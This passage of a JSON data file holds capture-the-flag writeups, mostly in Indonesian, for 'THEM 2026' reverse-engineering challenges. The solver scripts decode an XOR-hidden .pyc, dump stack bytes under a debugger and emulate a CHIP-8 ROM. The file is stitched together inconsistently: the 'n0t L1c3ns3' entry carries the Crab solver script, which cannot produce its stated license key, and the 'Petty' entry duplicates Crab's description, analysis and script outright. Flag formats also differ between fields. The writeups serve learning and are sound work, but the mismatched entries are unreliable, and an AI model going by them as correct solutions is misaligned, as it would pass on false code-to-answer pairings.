        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport base64\r\n\r\nBIN = Path('crab.exe')\r\nSTART = 0x2A009\r\nEND = 0x2AC34\r\nXOR_KEY = 0x69\r\n\r\nTARGET = (\r\n    241, 250, 126, 93, 101, 32, 92, 189, 201, 144, 156, 157, 61, 197, 242, 125,\r\n    64, 195, 80, 221, 116, 218, 238, 61, 89, 80, 154, 29, 13, 138, 66, 253,\r\n    209, 112, 64, 93, 69, 211, 66, 189, 41, 42, 242, 157, 29, 79, 204, 125,\r\n    161, 28, 162, 221, 85, 95, 192, 61, 184, 252, 246, 29, 109, 63, 170, 253,\r\n    48, 220, 178, 93, 165, 47, 180, 189, 8, 188, 198, 157, 125, 255, 40, 125,\r\n    129, 138, 142, 221, 181, 239, 36, 61, 153, 106, 194, 29, 77, 143, 156, 253,\r\n    17, 74, 146, 93, 133, 140, 130, 189, 104, 60, 38, 157, 93, 122, 26, 125,\r\n    225, 63, 240, 221, 149, 90, 22, 61, 248, 252, 54, 29, 173, 63, 248, 253,\r\n    113, 255, 224, 93, 229, 26, 226, 189, 72, 188, 10, 157, 189, 207, 108, 125,\r\n    193, 138, 252, 221, 244, 204, 106, 61, 216, 124, 6, 29, 141, 186, 194, 253,\r\n    81, 127, 192, 93, 197, 154, 212, 189, 169, 60, 110, 157, 156, 108, 70, 125,\r\n    32, 28, 34, 221, 213, 95, 64, 61, 57, 234, 118, 29, 236, 44, 56, 253,\r\n    177, 131, 62, 14,\r\n)\r\n\r\nSTD_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\r\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\r\n\r\n\r\ndef extract_embedded_pyc() -> bytes:\r\n    data = BIN.read_bytes()\r\n    pyc = bytes(b ^ XOR_KEY for b in data[START:END])\r\n    if pyc[:4] != bytes.fromhex('cb0d0d0a'):\r\n        raise RuntimeError('embedded pyc magic not found')\r\n    return pyc\r\n\r\n\r\ndef solve() -> str:\r\n    # The embedded Python verifier transforms custom_b64 bytes with:\r\n    # key(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\r\n    custom_b64 = ''.join(\r\n        chr(value ^ ((13 * (i ** 3) + 3 * (i ** 2) + 7 * i + 420) & 0xff))\r\n        for i, value in enumerate(TARGET)\r\n    )\r\n    std_b64 = custom_b64.translate(str.maketrans(CUSTOM_ALPHA, STD_ALPHA))\r\n    spaced_hex = base64.b64decode(std_b64).decode()\r\n    return bytes.fromhex(spaced_hex.replace(' ', '')).decode()\r\n\r\n\r\nif __name__ == '__main__':\r\n    extract_embedded_pyc()\r\n    print(solve())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{a_sn4k3_4nd_a_cr4b_c4n_b3_g00d_fr13nd5}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-crab",
    "title": "Crab",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Crab",
    "problemDescription": "Challenge memberikan file `crab.exe`, sebuah executable PE64 Windows hasil compile Rust. Dari enumerasi awal terlihat binary tidak menyimpan flag secara plaintext. Namun di bagian `.rdata` ada beberapa string mencurigakan seperti:\n\n- `bruhmemegang.pyc`\n- `python3.12`\n- `src\\main.rs`\n- `chall.py`\n- `Enter the passphrase:`\n- `Access Granted.` / `Access Denied.`\n\nIni mengarah ke payload Python bytecode yang disembunyikan di dalam binary Rust.",
    "tools": [],
    "analysis": "Pertama file dicek dengan:\n\n```bash\nfile crab.exe\nstrings -a -n 4 crab.exe | grep -Ei 'pyc|python|passphrase|access|main.rs|chall'\n```\n\nDitemukan area data yang terlihat seperti bytecode ter-obfuscate. Pada offset sekitar `0x2a009`, jika setiap byte di-XOR dengan `0x69`, empat byte pertama berubah menjadi magic Python bytecode:\n\n```text\ncb 0d 0d 0a\n```\n\nMagic tersebut cocok dengan `.pyc` Python 3.12. Jadi Rust binary menyimpan file `.pyc` yang dienkripsi sederhana dengan XOR `0x69`.\n\nPayload `.pyc` diekstrak dari range berikut:\n\n```text\nstart = 0x2a009\nend   = 0x2ac34\nkey   = 0x69\n```\n\nSetelah bytecode dianalisis, fungsi pentingnya bernama `check_flag(user_input)`. Secara garis besar validasinya:\n\n1. Input diubah ke hex.\n2. Hex diberi spasi per byte.\n3. String tersebut di-base64.\n4. Alphabet base64 standar ditranslasi ke alphabet custom.\n5. Setiap karakter hasil custom base64 di-XOR dengan polynomial key.\n6. Hasil akhirnya dibandingkan dengan array target sepanjang 196 byte.\n\nAlphabet base64 custom:\n\n```python\nSTD_ALPHA    = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\n```\n\nRumus key per indeks:\n\n```python\nkey(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\n```\n\nKarena transformasinya reversible, proses solving dilakukan dari target ke belakang:\n\n1. XOR ulang target dengan `key(i)` untuk mendapatkan custom base64.\n2. Translate alphabet custom kembali ke alphabet base64 standar.\n3. Base64 decode untuk mendapatkan spaced hex.\n4. Hapus spasi lalu decode hex menjadi flag asli.",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport base64\r\n\r\nBIN = Path('crab.exe')\r\nSTART = 0x2A009\r\nEND = 0x2AC34\r\nXOR_KEY = 0x69\r\n\r\nTARGET = (\r\n    241, 250, 126, 93, 101, 32, 92, 189, 201, 144, 156, 157, 61, 197, 242, 125,\r\n    64, 195, 80, 221, 116, 218, 238, 61, 89, 80, 154, 29, 13, 138, 66, 253,\r\n    209, 112, 64, 93, 69, 211, 66, 189, 41, 42, 242, 157, 29, 79, 204, 125,\r\n    161, 28, 162, 221, 85, 95, 192, 61, 184, 252, 246, 29, 109, 63, 170, 253,\r\n    48, 220, 178, 93, 165, 47, 180, 189, 8, 188, 198, 157, 125, 255, 40, 125,\r\n    129, 138, 142, 221, 181, 239, 36, 61, 153, 106, 194, 29, 77, 143, 156, 253,\r\n    17, 74, 146, 93, 133, 140, 130, 189, 104, 60, 38, 157, 93, 122, 26, 125,\r\n    225, 63, 240, 221, 149, 90, 22, 61, 248, 252, 54, 29, 173, 63, 248, 253,\r\n    113, 255, 224, 93, 229, 26, 226, 189, 72, 188, 10, 157, 189, 207, 108, 125,\r\n    193, 138, 252, 221, 244, 204, 106, 61, 216, 124, 6, 29, 141, 186, 194, 253,\r\n    81, 127, 192, 93, 197, 154, 212, 189, 169, 60, 110, 157, 156, 108, 70, 125,\r\n    32, 28, 34, 221, 213, 95, 64, 61, 57, 234, 118, 29, 236, 44, 56, 253,\r\n    177, 131, 62, 14,\r\n)\r\n\r\nSTD_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\r\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\r\n\r\n\r\ndef extract_embedded_pyc() -> bytes:\r\n    data = BIN.read_bytes()\r\n    pyc = bytes(b ^ XOR_KEY for b in data[START:END])\r\n    if pyc[:4] != bytes.fromhex('cb0d0d0a'):\r\n        raise RuntimeError('embedded pyc magic not found')\r\n    return pyc\r\n\r\n\r\ndef solve() -> str:\r\n    # The embedded Python verifier transforms custom_b64 bytes with:\r\n    # key(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\r\n    custom_b64 = ''.join(\r\n        chr(value ^ ((13 * (i ** 3) + 3 * (i ** 2) + 7 * i + 420) & 0xff))\r\n        for i, value in enumerate(TARGET)\r\n    )\r\n    std_b64 = custom_b64.translate(str.maketrans(CUSTOM_ALPHA, STD_ALPHA))\r\n    spaced_hex = base64.b64decode(std_b64).decode()\r\n    return bytes.fromhex(spaced_hex.replace(' ', '')).decode()\r\n\r\n\r\nif __name__ == '__main__':\r\n    extract_embedded_pyc()\r\n    print(solve())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{a_sn4k3_4nd_a_cr4b_c4n_b3_g00d_fr13nd5}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-eyeschico",
    "title": "eyes chico",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge eyes chico",
    "problemDescription": "Challenge ini berupa PE64 Windows console binary bernama `1983.exe`. Program meminta input dengan prompt `flag>`, lalu mencetak `correct` atau `wrong`.\n\nFlag:\n\n```text\nTHEM?!CTF{R3V3R53_3X3CU710N_VM_W17H_MU7471NG_R3G1573R5_4ND_C0N7R0L_FL0W_FL4773N1NG_M4K35_57471C_4N4LY515_P41NFUL}\n```",
    "tools": [],
    "analysis": "Enumerasi awal menunjukkan binary adalah PE32+ x86-64 hasil build MinGW:\n\n```bash\nfile 1983.exe\nstrings -a -n 4 1983.exe\n```\n\nString penting yang muncul:\n\n```text\nflag>\ncorrect\nwrong\n```\n\nDisassembly menunjukkan fungsi utama berada di sekitar `0x140002a40`. Fungsi ini tidak langsung membandingkan input dengan string statis. Sebelum membaca input, program menjalankan VM kecil berbasis bytecode dari `.rdata`, mengacak register internal 8 byte, menjalankan beberapa transformasi per-lane, lalu menulis buffer target ke stack.\n\nBagian pembacaan input berada setelah bytecode VM selesai. Pada alamat `0x140002b94`, program sudah selesai membangun buffer target dan baru akan memanggil `fgets`. Buffer target berada relatif terhadap stack di:\n\n```text\n$rsp + 0xbf\n```\n\nPanjang input yang diwajibkan adalah `0x71` byte atau 113 karakter. Setelah input dibaca, program membandingkan target hasil VM dengan input:\n\n- 112 byte pertama dibandingkan blok per blok memakai SIMD.\n- Byte terakhir dibandingkan lewat operasi XOR tambahan.\n- Jika semua byte cocok, program mencetak `correct`.",
    "solution": [
      {
        "title": "Eksploitasi",
        "content": "Karena target flag sudah tersedia di stack sebelum prompt input, cara paling sederhana adalah menghentikan program tepat sebelum `fgets`, lalu dump 113 byte dari `$rsp + 0xbf`.\n\nBreakpoint yang dipakai:\n\n\n\nContoh dump awal:\n\n\n\nNilai tersebut adalah dword little-endian, sehingga menjadi:\n\n\n\nScript `solve.py` mengotomatisasi langkah ini dengan `winedbg`, mengambil dword dari stack, mengubahnya dari little-endian ke byte string, lalu mencetak 113 byte pertama sebagai flag.",
        "code": "0x140002b94"
      },
      {
        "title": "Verifikasi",
        "content": "Flag hasil ekstraksi dikirim ke binary:\n\n\n\nOutput:",
        "code": "printf 'THEM?!CTF{R3V3R53_3X3CU710N_VM_W17H_MU7471NG_R3G1573R5_4ND_C0N7R0L_FL0W_FL4773N1NG_M4K35_57471C_4N4LY515_P41NFUL}\\n' | wine ./1983.exe"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport subprocess\r\n\r\n\r\nTARGET_LEN = 113\r\nBREAKPOINT = \"0x140002b94\"\r\nTARGET_OFFSET = \"0xbf\"\r\n\r\n\r\ndef main():\r\n    commands = [f\"break *{BREAKPOINT}\", \"cont\"]\r\n    for offset in range(0, TARGET_LEN + 3, 4):\r\n        commands.append(f\"x $rsp+{TARGET_OFFSET}+{offset}\")\r\n    commands.append(\"quit\")\r\n\r\n    proc = subprocess.run(\r\n        [\"winedbg\", \"./1983.exe\"],\r\n        input=\"\\n\".join(commands).encode(),\r\n        stdout=subprocess.PIPE,\r\n        stderr=subprocess.STDOUT,\r\n        check=False,\r\n    )\r\n\r\n    words = re.findall(rb\"Wine-dbg>\\s*([0-9a-fA-F]{8})\", proc.stdout)\r\n    if len(words) * 4 < TARGET_LEN:\r\n        raise SystemExit(\"failed to extract enough target bytes from winedbg output\")\r\n\r\n    target = b\"\".join(int(word, 16).to_bytes(4, \"little\") for word in words)\r\n    flag = target[:TARGET_LEN].decode()\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{R3V3R53_3X3CU710N_VM_W17H_MU7471NG_R3G1573R5_4ND_C0N7R0L_FL0W_FL4773N1NG_M4K35_57471C_4N4LY515_P41NFUL}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-notlicense",
    "title": "- n0t L1c3ns3",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge - n0t L1c3ns3",
    "problemDescription": "Binary yang diberikan adalah PE64 Windows console executable. Program meminta input license, mengecek panjang input harus tepat 17 karakter, lalu menjalankan validator internal yang bentuknya seperti VM kecil/generated bytecode.\n\nString penting yang terlihat dari hasil enumerasi:\n\n```text\nWelcome to THEM?!CTF license validator\nBad length. The machine rejects it.\nTHEM?!CTF{%s}\nNope. The machine keeps laughing.\n```\n\nDari sini terlihat bahwa jika license benar, program akan mencetak:\n\n```text\nTHEM?!CTF{%s}\n```",
    "tools": [],
    "analysis": "Panjang license dicek dengan `strlen`, lalu dibandingkan dengan `0x11`, sehingga license key harus sepanjang 17 byte.\n\nBagian validasi utama berada di sekitar fungsi `0x140002880`. Alur kasarnya:\n\n1. Program membaca input license.\n2. Menghapus newline dengan `strcspn`.\n3. Memastikan panjang input adalah 17.\n4. Untuk setiap karakter, program membangkitkan bytecode kecil dari beberapa tabel di `.rdata`.\n5. Bytecode tersebut dieksekusi untuk mengubah state internal dan failure accumulator.\n6. Jika semua karakter benar, state akhir harus memenuhi:\n\n```text\nfail == 0\nchecksum == 0x096c4f23\nstate_byte == 0x53\n```\n\nKarena ini PE Windows dan environment utama Linux, validator dieksekusi menggunakan Unicorn Engine. Import seperti `fgets`, `strlen`, `strcspn`, `puts`, dan printf wrapper di-stub agar binary bisa dijalankan secara lokal tanpa Wine.",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Judul: `n0t L1c3ns3`\n- Kategori: Reverse Engineering\n- File: `vmvv(1)`\n- Tujuan: recover license key, lalu submit sebagai `THEM?!CTF{license_key}`."
      },
      {
        "title": "Strategi Solving",
        "content": "Alih-alih menulis ulang seluruh VM secara manual, binary dijalankan langsung di Unicorn. Breakpoint penting dipasang pada:\n\n- `0x140002970`: awal proses validasi satu karakter.\n- `0x140002be7`: akhir proses satu karakter.\n\nPada setiap posisi karakter, state emulator disnapshot. Lalu semua kandidat printable dicoba satu per satu. Kandidat yang benar adalah kandidat yang membuat failure accumulator tetap `0` setelah satu karakter selesai diproses.\n\nHasil recovery per posisi:\n\n\n\nLicense key yang diperoleh:\n\n\n\nSaat license ini diberikan ke program, output suksesnya adalah:",
        "code": "0  -> b\n1  -> r\n2  -> 3\n3  -> 3\n4  -> 4\n5  -> 4\n6  -> k\n7  -> 1\n8  -> n\n9  -> g\n10 -> t\n11 -> h\n12 -> 1\n13 -> 1\n14 -> n\n15 -> g\n16 -> s"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport base64\r\n\r\nBIN = Path('crab.exe')\r\nSTART = 0x2A009\r\nEND = 0x2AC34\r\nXOR_KEY = 0x69\r\n\r\nTARGET = (\r\n    241, 250, 126, 93, 101, 32, 92, 189, 201, 144, 156, 157, 61, 197, 242, 125,\r\n    64, 195, 80, 221, 116, 218, 238, 61, 89, 80, 154, 29, 13, 138, 66, 253,\r\n    209, 112, 64, 93, 69, 211, 66, 189, 41, 42, 242, 157, 29, 79, 204, 125,\r\n    161, 28, 162, 221, 85, 95, 192, 61, 184, 252, 246, 29, 109, 63, 170, 253,\r\n    48, 220, 178, 93, 165, 47, 180, 189, 8, 188, 198, 157, 125, 255, 40, 125,\r\n    129, 138, 142, 221, 181, 239, 36, 61, 153, 106, 194, 29, 77, 143, 156, 253,\r\n    17, 74, 146, 93, 133, 140, 130, 189, 104, 60, 38, 157, 93, 122, 26, 125,\r\n    225, 63, 240, 221, 149, 90, 22, 61, 248, 252, 54, 29, 173, 63, 248, 253,\r\n    113, 255, 224, 93, 229, 26, 226, 189, 72, 188, 10, 157, 189, 207, 108, 125,\r\n    193, 138, 252, 221, 244, 204, 106, 61, 216, 124, 6, 29, 141, 186, 194, 253,\r\n    81, 127, 192, 93, 197, 154, 212, 189, 169, 60, 110, 157, 156, 108, 70, 125,\r\n    32, 28, 34, 221, 213, 95, 64, 61, 57, 234, 118, 29, 236, 44, 56, 253,\r\n    177, 131, 62, 14,\r\n)\r\n\r\nSTD_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\r\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\r\n\r\n\r\ndef extract_embedded_pyc() -> bytes:\r\n    data = BIN.read_bytes()\r\n    pyc = bytes(b ^ XOR_KEY for b in data[START:END])\r\n    if pyc[:4] != bytes.fromhex('cb0d0d0a'):\r\n        raise RuntimeError('embedded pyc magic not found')\r\n    return pyc\r\n\r\n\r\ndef solve() -> str:\r\n    # The embedded Python verifier transforms custom_b64 bytes with:\r\n    # key(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\r\n    custom_b64 = ''.join(\r\n        chr(value ^ ((13 * (i ** 3) + 3 * (i ** 2) + 7 * i + 420) & 0xff))\r\n        for i, value in enumerate(TARGET)\r\n    )\r\n    std_b64 = custom_b64.translate(str.maketrans(CUSTOM_ALPHA, STD_ALPHA))\r\n    spaced_hex = base64.b64decode(std_b64).decode()\r\n    return bytes.fromhex(spaced_hex.replace(' ', '')).decode()\r\n\r\n\r\nif __name__ == '__main__':\r\n    extract_embedded_pyc()\r\n    print(solve())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{br3344k1ngth11ngs}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-oldcassetter",
    "title": "Old Cassette",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Challenge ini hanya memberi satu file, `main.bin`. Dari byte awal terlihat pola instruksi seperti `00 e0`, `12 80`, `6x kk`, `8xy4`, dan `dxy5`. Itu cocok dengan ROM CHIP-8, bukan ELF atau format audio biasa.",
    "problemDescription": "Challenge ini hanya memberi satu file, `main.bin`. Dari byte awal terlihat pola instruksi seperti `00 e0`, `12 80`, `6x kk`, `8xy4`, dan `dxy5`. Itu cocok dengan ROM CHIP-8, bukan ELF atau format audio biasa.\n\nEntry point ROM berada di `0x200` dan langsung jump ke `0x280`, lalu ke routine utama di `0x900`. Routine utama menggambar teks ke layar CHIP-8. Karakter tidak disimpan langsung sebagai string, tetapi dihitung dari state dua register, `VA` dan `VB`.\n\nBagian penting:\n\n- `0x2c0` adalah PRNG/state update.\n- `0x282` menjalankan PRNG sebanyak counter 32-bit dari `V9:VC:VD:VE`.\n- `0x2ac` adalah delay besar: menjalankan `0xffffffff` step sebanyak `0xff` kali.\n- Setelah PRNG maju, ROM memilih salah satu tabel data berdasarkan `VA & 7`, mengambil byte pada offset tertentu, lalu menghitung karakter dengan `byte ^ VA ^ VB`.\n- Karakter hasilnya disimpan di `V9` dan digambar oleh dispatcher font di `0xdd2`.\n\nAwalnya emulator CHIP-8 sederhana sudah menampilkan prefix `THEM?!CTF`, tetapi eksekusi mentah menjadi lambat saat masuk delay besar. Karena state PRNG hanya 16-bit (`VA` dan `VB`), saya fast-forward dengan cycle detection. Dari sana seluruh karakter bisa diekstrak langsung tanpa render layar.\n\nHasil akhirnya:\n\n```text\nTHEM?!CTF{0LD_T4P3_N3V3R_D1E5K7}\n```\n\nScript final ada di `solve.py` dan menghasilkan flag yang sama saat dijalankan.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\n\r\n\r\nROM_PATH = Path(__file__).with_name(\"main.bin\")\r\n\r\n\r\ndef load_memory():\r\n    rom = ROM_PATH.read_bytes()\r\n    mem = bytearray(4096)\r\n    mem[0x200 : 0x200 + len(rom)] = rom\r\n    return mem\r\n\r\n\r\ndef solve():\r\n    mem = load_memory()\r\n\r\n    def step_state(a, b):\r\n        old_a, old_b = a, b\r\n\r\n        v0 = mem[0x800 + b] ^ b\r\n        v0 ^= {\r\n            0x00: 0xA9,\r\n            0x40: 0x5C,\r\n            0x80: 0xD3,\r\n            0xC0: 0x76,\r\n        }[b & 0xC0]\r\n\r\n        s = b + v0\r\n        b = s & 0xFF\r\n        carry = 1 if s > 0xFF else 0\r\n        a = (a + carry) & 0xFF\r\n\r\n        # The rotate/mix part uses the original VA/VB saved in V2/V3.\r\n        v2, v3 = old_a, old_b\r\n        for _ in range(5):\r\n            s = v3 + v3\r\n            v3 = s & 0xFF\r\n            c3 = 1 if s > 0xFF else 0\r\n\r\n            s = v2 + v2\r\n            v2 = s & 0xFF\r\n            c2 = 1 if s > 0xFF else 0\r\n\r\n            v2 |= c3\r\n            v3 |= c2\r\n\r\n        a ^= v2\r\n        b ^= v3\r\n\r\n        # The CHIP-8 routine stores VA/VB here after each PRNG step.\r\n        mem[0x58B] = a\r\n        mem[0x58C] = b\r\n        return a, b\r\n\r\n    cycle_cache = {}\r\n\r\n    def advance(a, b, n):\r\n        key = (a, b)\r\n        if key not in cycle_cache:\r\n            seen = {}\r\n            states = []\r\n            aa, bb = a, b\r\n            while (aa, bb) not in seen:\r\n                seen[(aa, bb)] = len(states)\r\n                states.append((aa, bb))\r\n                aa, bb = step_state(aa, bb)\r\n            cycle_cache[key] = (seen[(aa, bb)], states)\r\n\r\n        cycle_start, states = cycle_cache[key]\r\n        if n < len(states):\r\n            return states[n]\r\n\r\n        period = len(states) - cycle_start\r\n        return states[cycle_start + (n - cycle_start) % period]\r\n\r\n    def counter_value(v9, vc, vd, ve):\r\n        return v9 + 256 * vc + 65536 * vd + 16777216 * ve\r\n\r\n    def table_base(a):\r\n        return [0x400, 0x460, 0x4C0, 0x520, 0x600, 0x660, 0x6C0, 0x720][a & 7]\r\n\r\n    a, b = 0xA7, 0xC3\r\n    pc = 0x916\r\n    out = []\r\n\r\n    while pc < 0xDB6:\r\n        if mem[pc : pc + 4] == bytes.fromhex(\"65ff22ac\"):\r\n            # CALL 0x2ac repeats 0xffffffff PRNG steps 0xff times.\r\n            a, b = advance(a, b, 0xFFFFFFFF * 0xFF)\r\n            pc += 4\r\n        else:\r\n            assert mem[pc] == 0x69\r\n            assert mem[pc + 2] == 0x6C\r\n            assert mem[pc + 4] == 0x6D\r\n            assert mem[pc + 6] == 0x6E\r\n            assert mem[pc + 8 : pc + 10] == b\"\\x22\\x82\"\r\n\r\n            n = counter_value(mem[pc + 1], mem[pc + 3], mem[pc + 5], mem[pc + 7])\r\n            a, b = advance(a, b, n)\r\n            pc += 10\r\n\r\n        assert mem[pc : pc + 8] == bytes.fromhex(\"80a0610780122322\")\r\n        offset = mem[pc + 9]\r\n        addr = table_base(a) + offset\r\n        ch = mem[addr] ^ a ^ b\r\n        out.append(ch)\r\n\r\n        # The ROM mutates this lookup byte after decoding the character.\r\n        mem[addr] = b\r\n\r\n        assert mem[pc + 28 : pc + 30] == b\"\\x2d\\xd2\"\r\n        pc += 30\r\n\r\n    return bytes(out).decode()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    print(solve())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{0LD_T4P3_N3V3R_D1E5K7}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-rev-petty",
    "title": "Petty",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Petty",
    "problemDescription": "Challenge memberikan file `crab.exe`, sebuah executable PE64 Windows hasil compile Rust. Dari enumerasi awal terlihat binary tidak menyimpan flag secara plaintext. Namun di bagian `.rdata` ada beberapa string mencurigakan seperti:\n\n- `bruhmemegang.pyc`\n- `python3.12`\n- `src\\main.rs`\n- `chall.py`\n- `Enter the passphrase:`\n- `Access Granted.` / `Access Denied.`\n\nIni mengarah ke payload Python bytecode yang disembunyikan di dalam binary Rust.",
    "tools": [],
    "analysis": "Pertama file dicek dengan:\n\n```bash\nfile crab.exe\nstrings -a -n 4 crab.exe | grep -Ei 'pyc|python|passphrase|access|main.rs|chall'\n```\n\nDitemukan area data yang terlihat seperti bytecode ter-obfuscate. Pada offset sekitar `0x2a009`, jika setiap byte di-XOR dengan `0x69`, empat byte pertama berubah menjadi magic Python bytecode:\n\n```text\ncb 0d 0d 0a\n```\n\nMagic tersebut cocok dengan `.pyc` Python 3.12. Jadi Rust binary menyimpan file `.pyc` yang dienkripsi sederhana dengan XOR `0x69`.\n\nPayload `.pyc` diekstrak dari range berikut:\n\n```text\nstart = 0x2a009\nend   = 0x2ac34\nkey   = 0x69\n```\n\nSetelah bytecode dianalisis, fungsi pentingnya bernama `check_flag(user_input)`. Secara garis besar validasinya:\n\n1. Input diubah ke hex.\n2. Hex diberi spasi per byte.\n3. String tersebut di-base64.\n4. Alphabet base64 standar ditranslasi ke alphabet custom.\n5. Setiap karakter hasil custom base64 di-XOR dengan polynomial key.\n6. Hasil akhirnya dibandingkan dengan array target sepanjang 196 byte.\n\nAlphabet base64 custom:\n\n```python\nSTD_ALPHA    = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\n```\n\nRumus key per indeks:\n\n```python\nkey(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\n```\n\nKarena transformasinya reversible, proses solving dilakukan dari target ke belakang:\n\n1. XOR ulang target dengan `key(i)` untuk mendapatkan custom base64.\n2. Translate alphabet custom kembali ke alphabet base64 standar.\n3. Base64 decode untuk mendapatkan spaced hex.\n4. Hapus spasi lalu decode hex menjadi flag asli.",
    "solution": [
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport base64\r\n\r\nBIN = Path('crab.exe')\r\nSTART = 0x2A009\r\nEND = 0x2AC34\r\nXOR_KEY = 0x69\r\n\r\nTARGET = (\r\n    241, 250, 126, 93, 101, 32, 92, 189, 201, 144, 156, 157, 61, 197, 242, 125,\r\n    64, 195, 80, 221, 116, 218, 238, 61, 89, 80, 154, 29, 13, 138, 66, 253,\r\n    209, 112, 64, 93, 69, 211, 66, 189, 41, 42, 242, 157, 29, 79, 204, 125,\r\n    161, 28, 162, 221, 85, 95, 192, 61, 184, 252, 246, 29, 109, 63, 170, 253,\r\n    48, 220, 178, 93, 165, 47, 180, 189, 8, 188, 198, 157, 125, 255, 40, 125,\r\n    129, 138, 142, 221, 181, 239, 36, 61, 153, 106, 194, 29, 77, 143, 156, 253,\r\n    17, 74, 146, 93, 133, 140, 130, 189, 104, 60, 38, 157, 93, 122, 26, 125,\r\n    225, 63, 240, 221, 149, 90, 22, 61, 248, 252, 54, 29, 173, 63, 248, 253,\r\n    113, 255, 224, 93, 229, 26, 226, 189, 72, 188, 10, 157, 189, 207, 108, 125,\r\n    193, 138, 252, 221, 244, 204, 106, 61, 216, 124, 6, 29, 141, 186, 194, 253,\r\n    81, 127, 192, 93, 197, 154, 212, 189, 169, 60, 110, 157, 156, 108, 70, 125,\r\n    32, 28, 34, 221, 213, 95, 64, 61, 57, 234, 118, 29, 236, 44, 56, 253,\r\n    177, 131, 62, 14,\r\n)\r\n\r\nSTD_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\r\nCUSTOM_ALPHA = 'HIJKLMNOPQRSTUVWXYZABCDEFGhijklmnopqrstuvwxyzabcdefg6789012345+/'\r\n\r\n\r\ndef extract_embedded_pyc() -> bytes:\r\n    data = BIN.read_bytes()\r\n    pyc = bytes(b ^ XOR_KEY for b in data[START:END])\r\n    if pyc[:4] != bytes.fromhex('cb0d0d0a'):\r\n        raise RuntimeError('embedded pyc magic not found')\r\n    return pyc\r\n\r\n\r\ndef solve() -> str:\r\n    # The embedded Python verifier transforms custom_b64 bytes with:\r\n    # key(i) = (13*i^3 + 3*i^2 + 7*i + 420) & 0xff\r\n    custom_b64 = ''.join(\r\n        chr(value ^ ((13 * (i ** 3) + 3 * (i ** 2) + 7 * i + 420) & 0xff))\r\n        for i, value in enumerate(TARGET)\r\n    )\r\n    std_b64 = custom_b64.translate(str.maketrans(CUSTOM_ALPHA, STD_ALPHA))\r\n    spaced_hex = base64.b64decode(std_b64).decode()\r\n    return bytes.fromhex(spaced_hex.replace(' ', '')).decode()\r\n\r\n\r\nif __name__ == '__main__':\r\n    extract_embedded_pyc()\r\n    print(solve())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{a_sn4k3_4nd_a_cr4b_c4n_b3_g00d_fr13nd5}",
    "lessonsLearned": ""
  },
  {
